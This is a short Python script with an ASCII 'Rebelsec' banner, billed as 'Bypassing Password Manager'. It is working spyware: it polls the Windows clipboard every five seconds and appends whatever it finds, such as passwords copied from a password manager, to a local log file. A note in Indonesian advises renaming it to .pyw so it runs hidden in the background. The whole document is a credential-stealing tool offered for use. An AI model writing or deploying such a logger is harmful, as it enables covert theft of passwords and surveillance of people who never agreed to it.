from win32 import win32clipboard
import time

print("""

Bypassing Password Manager :
 ____      _          _
|  _ \ ___| |__   ___| |___  ___  ___
| |_) / _ \ '_ \ / _ \ / __|/ _ \/ __|
|  _ <  __/ |_) |  __/ \__ \  __/ (__
|_| \_\___|_.__/ \___|_|___/\___|\___|

Note : Hanya Work di Windows   
kalau ingin jalan di belakang layar ganti extensi jadi ".pyw" cth = logger.pyw

""")
while True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    with open('logs.txt', 'a+') as target:
        target.write(data+'\n')
    time.sleep(5)
